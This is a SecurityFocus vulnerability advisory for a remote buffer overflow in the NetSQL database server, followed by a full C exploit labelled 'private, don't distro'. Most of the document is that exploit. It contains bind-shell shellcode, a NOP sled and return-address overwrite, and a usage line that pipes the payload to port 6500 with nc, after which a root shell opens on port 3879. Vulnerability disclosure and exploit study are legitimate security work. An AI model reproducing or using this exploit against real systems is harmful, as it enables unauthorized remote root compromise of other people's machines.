source: http://www.securityfocus.com/bid/2885/info

NetSQL is an implementation of a database and toolset distributed by Munica Corporation. NetSQL is part of 5 piece software package called the Webpak, containing utilities for features such as web boards, membership, and online calendars.

A buffer overflow in the server makes it possible for a remote user to gain remote root access to a system using the affected software. By sending a long string to port 6500, a remote user can create a buffer overflow, allowing code execution.

This makes it possible for a remote user to gain remote root access, resulting in complete compromise of a system using the affected software.

/* PRIVATE EXPLOIT, DONT DISTRO%$##$%$# 
 * Remote exploit for NetSQL server, by Sergio Monteiro a.k.a Papa-tudo 
 * netsqld - An SQL database server with Web interface
 * check http://www.sekurity.com.br .
 *
 * There is an easily exploitable buffer overflow in netsql.
 * This exploit was tested on redhat 6.2. 
 * 
 * Run like: ./netsql | nc host.com 6500 
 * Then connect to port 3879 for the rootshell.
 *
 * Greets: www.sekurity.com.br
 * Author: Papa-tudo - 
 *
 *PRIVATE EXPLOIT, DONT DISTRO%$##$%$#
*/

 
#include <stdio.h>
#include <string.h>

#define RET 0xbffea3d0

char crap[80];
char cmd[1024];

char shellcode[] =
"\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
"\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
"\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
"\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
"\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
"\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
"\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
"\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";

int
main (int argc, char *argv[])

{

char *buf;
int bsize=180, offset = 0, len = 151, i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);
  if (argc > 3) len = atoi(argv[3]);

  buf = malloc(bsize);

  memset (buf, '\x90', bsize);
  memset(crap, '\x41', 80);

       for (i = len; i < bsize - 4; i += 4)
      *(long *) &buf[i] = RET + offset;

  memcpy (buf + (len - strlen (shellcode)), shellcode, strlen (shellcode));

  crap[sizeof(crap)] = '\0';
  buf[bsize - 1] = '\0';

  fprintf(stderr, "Return Address = 0x%x\n", RET + offset);
  fprintf(stderr, "Running with offset %d\n", offset);

printf("76 CONNECT %s ON %s USER=\'netsql\' PASSWORD=\'none\'\n", crap, buf);

}